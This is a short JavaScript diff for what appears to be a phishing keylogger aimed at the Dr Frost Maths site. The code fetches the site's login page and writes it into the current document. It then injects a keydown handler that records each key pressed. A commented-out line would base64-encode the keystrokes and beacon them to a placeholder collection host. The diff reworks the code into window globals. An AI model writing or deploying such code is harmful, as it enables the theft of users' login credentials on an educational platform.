@@ -1,18 +1,18 @@
 //(function() {
-  const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
-  const bin = 'https://???/bin?data='
+  window.comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
+  window.bin = 'https://???/bin?data='
 
-  const load = async path => document.write(
+  window.load = async path => document.write(
     await fetch(path)
     .then(r => r.text())
   )
 
-  const log = data => {
+  window.log = data => {
     //new Image()
     //.src = `${bin}${btoa(JSON.stringify(data))}`
     console.log(`in data: ${data}`)
   }
   
-  await load(`/login.php?url=${encodeURIComponent(comfort)}`)
+  load(`/login.php?url=${encodeURIComponent(comfort)}`)
   document.body.innerHTML += `<script>window.onkeydown=${({key}) => log({key})}</script>`
 //})()
